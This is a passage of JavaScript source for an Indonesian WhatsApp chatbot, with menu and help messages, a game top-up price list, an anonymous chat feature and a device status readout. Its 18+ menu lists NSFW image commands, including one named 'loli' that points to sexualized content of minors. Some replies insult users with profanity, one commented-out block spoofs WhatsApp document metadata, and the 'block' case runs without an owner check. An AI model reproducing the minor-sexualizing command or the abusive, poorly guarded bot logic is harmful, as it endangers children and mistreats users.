「 𝑩𝑶𝑻 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 」
🐥 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
🐥 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
🐥 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*

「 き⃟💀𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔💀き⃟ 」
き⃟🔖 𝐠𝐫𝐨𝐮𝐩 𝐦𝐞𝐧𝐮
𝕷𝖀⃢🦠 𝕷𝖀⃢き⃟🔖 𝐰𝐢𝐛𝐮 𝐦𝐞𝐧𝐮
き⃟🔖 𝐬𝐭𝐢𝐜𝐤𝐞𝐫 𝐦𝐞𝐧𝐮
 𝕷き⃟🔖 𝐨𝐰𝐧𝐞𝐫 𝐦𝐞𝐧𝐮
き⃟🔖 𝐠𝐚𝐦𝐞 𝐦𝐞𝐧𝐮
         ཽ͢ き⃟🔖 𝐟𝐮𝐧 𝐦𝐞𝐧𝐮
き⃟💀🔖 𝐝𝐨𝐰𝐧𝐥𝐨𝐚𝐝 𝐦𝐞𝐧𝐮
            き⃟🔖 𝐢𝐧𝐟𝐨 𝐦𝐞𝐧𝐮ᡃ⃟⃢
き⃟🔖 𝐨𝐭𝐡𝐞𝐫 ᡃ⃟⃢𝐦𝐞𝐧𝐮ᡃ⃟⃢
           き⃟🔖 𝐬𝐞𝐰𝐚𝐛𝐨𝐭
 き⃟🔖 𝟏𝟖+.             
  き⃟🔖𝐬𝐥𝐚𝐦 𝐦𝐞𝐧𝐮👑
き⃟🔖 𝐫𝐚𝐧𝐝𝐨𝐦𝐭𝐞𝐱𝐭
    👑 🔖 𝐦𝐨𝐯𝐢𝐞 𝐦𝐞𝐧𝐮
き⃟🔖 𝐫𝐚𝐧𝐝𝐨𝐦𝐢𝐦𝐚𝐠𝐞
                          ࣧࣧき⃟🔖 𝐞𝐩𝐡𝐨𝐭𝐨👑
き⃟🔖 𝐩𝐡𝐨𝐭𝐨𝐤𝐲
           き⃟🔖 𝐭𝐞𝐱𝐭𝐩𝐫𝐨💀
き⃟🔖 𝐈𝐦𝐚𝐠𝐞𝐦𝐚𝐧𝐢
             き⃟🔖 𝐍𝐬𝐟𝐰𝐚𝐧𝐢𝐦𝐞
き⃟🔖𝐛𝐞𝐫𝐢𝐭𝐚 𝐦𝐞𝐧𝐮
           き⃟🔖𝐢𝐧𝐟𝐨 𝐦𝐞𝐧𝐮
き⃟🔖𝐢𝐧𝐟𝐨 𝐠𝐥𝐨𝐛𝐚𝐥 𝐦𝐞𝐧𝐮💀

  ├─「 *𝙏𝙃𝘼𝙉𝙆𝙎 𝙏𝙊👑* 」
  │
  ├ \`\`\`ALLAH SWT\`\`\`
  ├\`\`\` Nino Chan\`\`\`
  ├ \`\`\`Xinz Bot\`\`\`
  ├ \`\`\`Manurius\`\`\`
  ├ \`\`\`Arif\`\`\`
  ├ \`\`\`Fathur\`\`\`
  ├ \`\`\`Kahfz (Saya)\`\`\`
  ├ \`\`\`Nyx (Panutan Saya)\`\`\`
  ├ \`\`\`Kwn² Yg Bantu Gw\`\`\`
  ├ \`\`\`And all creator bot\`\`\`
  └──「 *${botName}* 」
*ꪶ ཻུ۪۪ꦽꦼ̷⸙KahfzBotzꪶ ཻུ۪۪ꦽꦼ̷⸙ || ${date}*`,
buttons: [{buttonId: `${prefix}command`,buttonText:{displayText: '🐣𝗠𝗘𝗡𝗨🐣'},type:1},{buttonId: `${prefix}cara22`,buttonText:{displayText: 'CARA MENGGUNAKAN BOT🌛'},type:1},{buttonId:`${prefix}commend`,buttonText:{displayText:'STORE'},type:1}],
"headerType": "DOCUMENT", "documentMessage": {
            "url": "https://mmg.whatsapp.net/d/f/Ano5cGYOFQnC51uJaqGBWiCrSJH1aDCi8-YPQMMb1N1y.enc",
            "mimetype": "application/pdf",
            "title": "KirBotz.pdf",
            "fileSha256": "8Xfe3NQDhjwVjR54tkkShLDGrIFKR9QT5EsthPyxDCI=",
            "fileLength": "999999999999",
            "pageCount": 999,
            "mediaKey": "XWv4hcnpGY51qEVSO9+e+q6LYqPR3DbtT4iqS9yKhkI=",
            "fileName": "KahfzBot",
            "fileEncSha256": "NI9ykWUcXKquea4BmH7GgzhMb3pAeqqwE+MTFbH/Wk8=",
            "directPath": "/v/t62.7119-24/35160407_568282564396101_3119299043264875885_n.enc?ccb=11-4&oh=d43befa9a76b69d757877c3d430a0752&oe=61915CEC",
            "mediaKeyTimestamp": "1634472176",
            "jpegThumbnail": fs.readFileSync('./media/Menu.jpg'),
  }}, MessageType.buttonsMessage,{ quoted: troli,thumbnail: fs.readFileSync('./media/Menu.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${week}`,body:"Kahfz Bot",mediaType:"2",thumbnail:ikyadd,mediaUrl:`https://youtube.com/channel/UCLWReaUjBkrRzI-OnGlWskw`}})
break*/
case 'indonesia12':
case 'indonesia':

textt = `
Hello${pushname}\n${ucapanWaktu} 
 `
kahfzz.sendMessage(from, { contentText: `${textt}`, footerText: `Ini adalah bot WhatsApp yg bisa membantu anda !
contoh command simpel

# *!sticker* yaitu untuk membuat sticker di WhatsApp 
*kirim/reply foto* dengan caption *!sticker*
 
# *!ytdl* yaitu untuk mengunduh video/audio dari YouTube 
*kirim perintah !ytdl di teruskan judul/link YouTube*
 
# *!tahta* yaitu untuk membuat logo *
kirim perintah !tahta di lanjut nama request terserah kalian*
 
# *!anime* yaitu untuk stalk anime 
*kirim perintah !anime lanjut judul anime*
 
# *!pinterest* yaitu untuk membantu mencari gambar 
*kirim perintah !pinterest lanjut dengan gambar yg kalian cari*
 
# *!nulis* yaitu untuk membantu anda menulis sesuatu dalam bentuk foto 
*kirim perintah !nulis di lanjut dengan teks yg akan di tulis*
 
# *!alquran* yaitu untuk melihat isi surat yg kalian cari beserta artinya 
*kirim perintah !alquran di lanjut dengan ayat dan surah yg kalian cari*

# *!coronaindo* yaitu untuk melihat info corona yang berada di indonesia
 *kirim perintah !coronaindo untuk melihat nya*
 
 # *!bugreport* yaitu untuk report bug / error dalam kendala fitur bot
*kirim perintah !bugreport (teks nya)*
 
 # *requestfitur* yaitu meng request fitur untuk lebih bagus 
 *kirim perintah !requestfitur (teks nya)*
 
*Silahkan kalian coba fitur-fitur lain yg sudah di sediakan bot*
 
*Warning*
-dilarang menelpon/vc bot
-dilarang spam bot/jeda 5 detik
-dilarang masukan bot sembarang grup (izin owner,)
-dilarang menggunakan fitur dewasa untuk anak di bawah 18th
-gunakan bot dengan bijak
 
*jadilah pengguna yang baik dan mematuhi rules*
*menu lainnya bisa kalian liat sendiri dengan ketik !command* `,buttons: [{ buttonId: noprefix ? "rules" : "!"+"rules", buttonText: { displayText: 'RULES BOT' }, type: 1 }], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
break
case 'inggres22':
case 'inggris':
case 'english':
textt = `
Hello${pushname}\n
 `
kahfzz.sendMessage(from, { contentText: `${textt}`, footerText: `This is a WhatsApp bot that can help you!
simple command example

# *!sticker* is to make stickers on WhatsApp
*send/reply photo* with caption *!sticker*
 
# *!ytdl* which is to download video/audio from YouTube
*send command !ytdl in forward YouTube title/link*
 
# *!throne* that is to create a logo *
send an order! the throne is continued, the name of the request is up to you*
 
# *!anime* that is for stalk anime
*send command !anime continue anime title*
 
# *!pinterest* which is to help find pictures
*send a !pinterest command further with the image you are looking for*
 
# *!write* is to help you write something in the form of a photo
*send the command! write further with the text to be written*
 
# *!quran* is to see the contents of the letter you are looking for and its meaning
*send orders!quran is continued with the verse and surah you are looking for*
notes:
_Special Features of Islam Non-Muslims Can Use_ 

# *!coronaindo* which is to see info on corona in Indonesia
 *send command !coronaindo to see it*
 
 # *!bugreport* which is to report bugs / errors in bot feature constraints
*send command !bugreport (text)*
 
*Please try other features that have been provided by the bot*
 
*Warning*
-no calls/vc bots
-no spam bots/pause 5 seconds
- it is forbidden to enter bots in any group (owner's permission,)
-Do not use adult features for children under 18 years old
-use bots wisely
 
*be a good user and obey the rules*
*other menus you can see for yourself by typing !command* `,buttons: [{ buttonId: noprefix ? "rules" : "!"+"rules", buttonText: { displayText: 'RULES BOT' }, type: 1 }], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
break
break
case 'cara22':
 txtt =`Hello${pushname}\nSilahkan Pilih Bahasa\n\nPlease Select Language`

 buttons = [{buttonId: noprefix ? "indonesia12" : "!"+"indonesia12",buttonText:{displayText: 'INDONESIA'},type:1},{buttonId:noprefix ? "inggres22" : "!"+"inggres22", buttonText:{displayText:'INGGRIS'},type:1}]
 buttonsMessage = {
contentText: `${txtt}`,
footerText: 'Jika Button Tidak Terlihat Ketik *!allcara*',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
break
case 'statuswa':
uptime = process.uptime();
					const timestampu = speed();
					const latensi = speed() - timestampu
					var total = math(`${groups.length} ${privat.length}`)
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = kahfzz.user.phone
					stamtus = `⍟ ────────────────── ⍟

Private Chat : ${privat.length}
Group Chat : ${groups.length}
Total Chat : ${totalChat.length}
Speed : ${latensi.toFixed(4)} second
Runtime : ${kyun(uptime)}
Baterai : ${baterai.battery}
Charged : ${baterai.isCharge}
Mode : ${kahfzz  ? 'public' : 'self'}
Prefix : ${kahfzz ? 'Multi Prefix' : 'No Prefix'}
Penggunaan Ram : ${ram2}
Hostname : ${os.hostname()}
Platform : ${os.platform()}
Uptime : ${kyun(os.uptime())}
MNC : ${mnc}
MCC : ${mcc}
Device Model: ${kahfzz.user.phone.device_model}
Device Manufactur : ${device_manufacturer}
Wa Version: ${kahfzz.user.phone.wa_version}
Os Version: ${kahfzz.user.phone.os_version}

⍟ ────────────────── ⍟`
kahfzz.sendMessage(from, { contentText: `${stamtus}`, footerText: `🐣 Day : ${week} ${weton}\n🐥 Date : ${date}`,buttons: [{ buttonId: noprefix ? "rules" : "!"+"rules", buttonText: { displayText: 'RULES BOT' }, type: 1 },{ buttonId: noprefix ? "cara22" : "!"+"cara22", buttonText: { displayText: 'CARA MENGGUNAKAN BOT' }, type: 1 }], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
break
	case 'ban':

				kahfzz.updatePresence(from, Presence.composing) 
					if (args.length < 1) return
					if (!isOwner) return reply(mess.only.owner)
					mentioned = kahfzz.message.extendedTextMessage.contextInfo.mentionedJid
			        ban = mentioned
					reply(`berhasil banned : ${ban}`)
					break
		case 'unban':
bnnd = body.slice(7)

ban.splice(`${bnnd}@s.whatsapp.net`, 1)

fs.writeFileSync('database/user/banned.json', JSON.stringify(ban))

reply(`${bnnd} telah di unban`)

break
case 'block':
				 kahfzz.updatePresence(from, Presence.composing) 
					kahfzz.blockUser (`${body.slice(7)}@c.us`, "add")
					kahfzz.sendMessage(from, `*Perintah Diterima, Memblokir* ${body.slice(7)}@c.us`, text)
case 'allcara':
reply(` Kirim Perintah *_!indonesia_* Untuk Melihat Cara Dengan Bahasa Indonesia

Send Command *_!english_* To See How With English`)
break
case 'mentod22':
thu = await kahfzz.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
 if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
  groups = kahfzz.chats.array.filter(v => v.jid.endsWith('g.us'))
privat = kahfzz.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
uptime = process.uptime();
timestampe = speed();
totalChat = await kahfzz.chats.all()
latensie = speed() - timestampe
total = math(`${groups.length}*${privat.length}`)

menu =`${botName}

 ${ucapanWaktu} ${pushname} 👋


_INI ADALAH BOT WHASSAP !!!_

GUNAKAN BOT INI UNTUK KEBAIKAN DAN TIDAK UNTUK KE CURANGAN/KEJAHATAN!!

`

kahfzz.sendMessage(from, { contentText: `${menu}`, footerText: `
🐣 Day : ${week} ${weton}\n🐥 Date : ${date}\n\n*⚠️BACA TOD⚠️*\nJika Wa Lu Gak Support Button Ketik *!allmenu*`,buttons: [{ buttonId: noprefix ? "yha22" : "!"+"yha22", buttonText: { displayText: 'LIST MESSAGE' }, type: 1 },{ buttonId: noprefix ? "sewabot" : "!"+"sewabot", buttonText: { displayText: '🏷️ RENT A BOT' }, type: 1 },{ buttonId: noprefix ? "botan" : "!"+"botan", buttonText: { displayText: 'ANON BOT' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
break
case 'yha22':
 txtt =`Hai Kak ${pushname}\nAda 3 Menu Silahkan Pilih`

 buttons = [{buttonId: noprefix ? "command" : "!"+"command",buttonText:{displayText: 'MENU 1 📘'},type:1},{buttonId:noprefix ? "commend" : "!"+"commend", buttonText:{displayText:'MENU 2 📘'},type:1},{buttonId: noprefix ? "allmenu" : "!"+"allmenu",buttonText:{displayText:'ALLMENU📘'},type:1}]
 buttonsMessage = {
contentText: `${txtt}`,
footerText: 'Jika Button Tidak Terlihat Ketik *!allmenu*',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
break
case 'commend':
list = []
listmenu = [`sewabot`,`buysc22`,`topupgame`]
listmenuu = [`SEWA BOT`,`BUY SC BOT`,`TOP UP ALL GAME`]
nombor = 1
startnum = 0
for (let x of listmenu) {
  const yy = {title: 'menu ke' + nombor++,
  rows: [
  {
title: `${listmenuu[startnum++]}`,
description: ``,
rowId: `${prefix}${x}`
 }
 ]
  }
  list.push(yy)
}
listmsg(from, `${ucapanWaktu} ${pushname} 👋

  Hallo Saya  ${botName} Store
  Silahkan Pilih Store Kahfz Di Sini !
  `,`🐣 Day : ${week} ${weton}\n🐥 Date : ${date}  `, list, { quoted: freply})
break
case 'topupgame':
list = []
listmenu = [`emel1`,`ngepep1`,`pubgame1`]
listmenuu = [`MOBILEGENDS 🌛`,`FREE FIRE 🐦`,`PUBG 🤷‍♂️`]
nombor = 1
startnum = 0
for (let x of listmenu) {
  const yy = {title: 'menu ke' + nombor++,
  rows: [
  {
title: `${listmenuu[startnum++]}`,
description: ``,
rowId: `${prefix}${x}`
 }
 ]
  }
  list.push(yy)
}
listmsg(from, `${ucapanWaktu} ${pushname} 👋

  Pilih Game Yang Akan Anda Tujui / Top Up

Harga Diamond Sama Seperti : *_Unipin_* / *_CodaShop_* !!
  `,`Silahkan Pilih List !!`, list, { quoted: freply})
break
case 'ngepep1':
gopeynya = `${ppbot}`
  buff = await getBuffer(gopeynya)
tytyd22 =`

*_Silahkan Pilih Diamond Nya_*
Jika Ada Masukan Atau Apa Ketik *!owner*


DIAMOND  70     =  Rp 10.000,00
DIAMOND 100    =  Rp 15.000,00
DIAMOND 140    =  Rp 20.000,00
DIAMOND 210    =  Rp 30.000,00
DIAMOND 355    =  Rp 50.000,00
 DIAMOND 500   =  Rp 70.000,00
 DIAMOND 720   =  Rp 100.000,00
 DIAMOND 1000 =  Rp 140.000,00
 DIAMOND 1215 =  Rp 167.000,00
DIAMOND  2005 =  Rp 270.000,00
 DIAMOND 4005  = Rp 535.000,00
 `
buttons = [{buttonId: noprefix ? "menu" : "!"+"owner",buttonText:{displayText: `OWNER`},type:1},{buttonId: `${prefix}payment`,buttonText:{displayText: `PAYMENT`},type:1},{buttonId: `${prefix}membership`,buttonText:{displayText: `MEMBERSHIP FREE FIRE`},type:1}]
  imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'follow @Kahfz_13', imageMessage: imageMsg,
  contentText: tytyd22,buttons,headerType:4}
  prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  kahfzz.relayWAMessage(prep)
break
case "botanon":
tutor2 = 
`*BOT ANON BETA*

ini adalah fitur anonymous chat, fitur random chat antar pengguna bot, fitur ini tidak bisa digunakan secara berkelompok (hanya chat pribadi) untuk menggunakan fitur anonymous type ! bot telegram,\n-!mulai mulai \n-!berhenti untuk berhenti mencari teman \n-!selanjutnya mencari teman lain(lewati)

*Peringatan*
-sopan
-tidak ada panggilan/vc bot
-tidak ada bot spam/jeda 5 detik
-tidak diperbolehkan memasukkan bot di grup manapun (izin pemilik)
-Jangan gunakan fitur dewasa untuk anak di bawah 18 tahun -gunakan bot dengan bijak

*jadilah pengguna yang baik dan patuhi aturan*` 

 sendButMessage(from, tutor2, `created Kahfz_13`, [
  {
 buttonId: noprefix ? "start" : "!"+"start",
 buttonText: {
displayText: `⬡ START>/ ANONMYUSCHAT `,
 },
 type: 1,
 },
 {
buttonId: noprefix ? "menu" : "!"+"menu",
 buttonText: {
displayText: `⬡ BACK </  BALIK`,
 },
 type: 1,
  },]);
break
case 'botanon2':
tutor3 = `
*ANONYMOUS BOT BETA*

this is an anonymous chat feature, a random chat feature among bot users, this feature cannot be used in groups (only personal chat) to use the anonymous feature type !anonymous in the personal chat bot , later the bot will find friends for you like a telegram bot,\n-!start to start \n-!stop to stop looking for friends \n-!next to find other friends(skip)

*Warning* 
-polite
-no calls/vc bots 
-no spam bots/pause 5 seconds 
-not allowed to enter bots in any group (owner's permission) 
-Do not use adult features for children under 18 years old -use bots wisely 

*be a good user and obey the rules*
`
sendButMessage(from, tutor3, `created Kahfz_13`, [
  {
 buttonId: noprefix ? "start" : "!"+"start",
 buttonText: {
displayText: `⬡ START>/ ANONMYUSCHAT `,
 },
 type: 1,
 },
 {
buttonId: noprefix ? "menu" : "!"+"menu",
 buttonText: {
displayText: `⬡ BACK </  KEMBALI`,
 },
 type: 1,
  },]);
break
case 'botan':
 txtt =`Hai Kak ${pushname}\nIndo Translate:\nApakah Anda Dari Indonesia!?\nInggris Translate:\n Are You From England!?`

 buttons = [{buttonId: noprefix ? "botanon" : "!"+"botanon",buttonText:{displayText: 'SAYA DARI INDO'},type:1},{buttonId:noprefix ? "botanon2" : "!"+"botanon2", buttonText:{displayText:'I AM FROM UK'},type:1}]
 buttonsMessage = {
contentText: `${txtt}`,
footerText: 'Jangan Lupa Patuhi Rules/Dont Forget to Follow the Rules',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
 break
case 'allmenu':
case 'allmeni':
tod22 = `
Wait Menu Akan Muncul Dalam 5 Detik Untuk Menghindari Spam!!
`
kahfzz.sendMessage(from, { contentText: `${tod22}`, footerText: ` © *_Kahfz Bot_*`,buttons: [{ buttonId: noprefix ? "yobang" : "!"+"yobang", buttonText: { displayText: 'OKE BANG 😎' }, type: 1 },{ buttonId: noprefix ? "sewabot" : "!"+"sewabot", buttonText: { displayText: 'SEWA BOT' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
  await sleep(7000)
txtt =`Hai Tod Ngen Tod ${pushname}\n Mau Allmenu Yang Mana Ngentot Silahkan Pilih 😎`

 buttons = [{buttonId: noprefix ? "allmenud" : "!"+"allmenud",buttonText:{displayText: '⃢⃢ALLMENU 1👑⃢⃢'},type:1},{buttonId:noprefix ? "allmenut" : "!"+"allmenut", buttonText:{displayText:'⃢⃢ALLMENU 2👑⃢⃢'},type:1}]
 buttonsMessage = {
contentText: `${txtt}`,
footerText: 'Nanya Owner Cuman Nyari Case Allmenu Product Anda Tolol Ajg',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
 break
case 'allmenud':

       thu = await kahfzz.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)

if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})

       groups = kahfzz.chats.array.filter(v => v.jid.endsWith('g.us'))

              privat = kahfzz.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))

              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`

              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`

              uptime = process.uptime();

              timestampe = speed();

              totalChat = await kahfzz.chats.all()

              latensie = speed() - timestampe

              total = math(`${groups.length}*${privat.length}`)

              

    allmenu =`  🌹𝐇𝐄𝐋𝐋𝐎𝐖𝐎𝐑𝐋𝐃🌹

${botName} 
${ucapanWaktu} Kak ${pushname} 👋
  
「 𝑪A𝑳𝑬N𝑫𝑨𝑹 」

🐥 Day : ${week} ${weton} 
🐥 Date : ${date}
        
「 𝒀𝑶𝑼𝑹 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 」

🐥 *Username:* ${pushname}
🐥 *Bio Info:* ${thu.status}
🐥 *Premium*: ${isPremium ? 'Ya' : 'No'}
🐥 *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}
🐥 *Level*: ${Levelnye}
🐥 *XP*: ${Xpluu} / ${requiredXplu}

「 𝑩𝑶𝑻 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 」

🐥 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
🐥 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
🐥 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*
 
 
「 𝐀𝑳𝑳 𝐌𝐄𝐍𝐔 」

「 𝐎𝐖𝐍𝐄𝐑 」
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}off*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}on*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}status*_

「 𝐌𝐀𝐊𝐄𝐑 」
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}sticker*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}swm*_ <author|packname>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}take*_ <author|packname>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}fdeface*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}emoji*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}nulis*_

「 𝐂𝐎𝐍𝐕𝐄𝐑𝐓 」
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}toimg*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}tomp3*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}tomp4*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}slow*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}fast*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}reverse*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}tourl*_

「 𝐔𝐏 𝐒𝐓𝐎𝐑𝐘 」
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}upswteks*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}upswimage*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}upswvideo*_

「 18+ 」
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}chiisaihentai*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}trap*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}blowjob*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}yaoi*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}ecchi*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}hentai*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}ahegao*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}hololewd*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}sideoppai*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}animefeets*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}animebooty*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}animethighss*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}hentaiparadise*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}animearmpits*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}hentaifemdom*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}lewdanimegirls*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}biganimetiddies*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}animebellybutton*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}hentai4everyone*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}loli*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}husbu*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}milf*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}cosplay*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}wallml*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}pornhub*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}glitch*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}avenger*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}space*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}ninjalogo*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}marvelstudio*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}lionlogo*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}wolflogo*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}steel3d*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}wallgravity*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}tiktok*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}arcade8bit*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}battlefield4*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}pubg*_

「 RANDOM 」
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}ppcouple*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}anime*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}wallpaper*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}neko*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}meme*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}quotes*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}quotesimage*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}randomnama*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}faktaunik*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}katabijak*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}pantun*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}bucin*_

「 TEXTPROME 」
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}blackpink*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}neon*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}greenneon*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}advanceglow*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}futureneon*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}sandwriting*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}sandsummer*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}sandengraved*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}metaldark*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}neonlight*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}holographic*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}text1917*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}minion*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}deluxesilver*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}newyearcard*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}bloodfrosted*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}halloween*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}jokerlogo*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}fireworksparkle*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}natureleaves*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}bokeh*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}toxic*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}strawberry*_
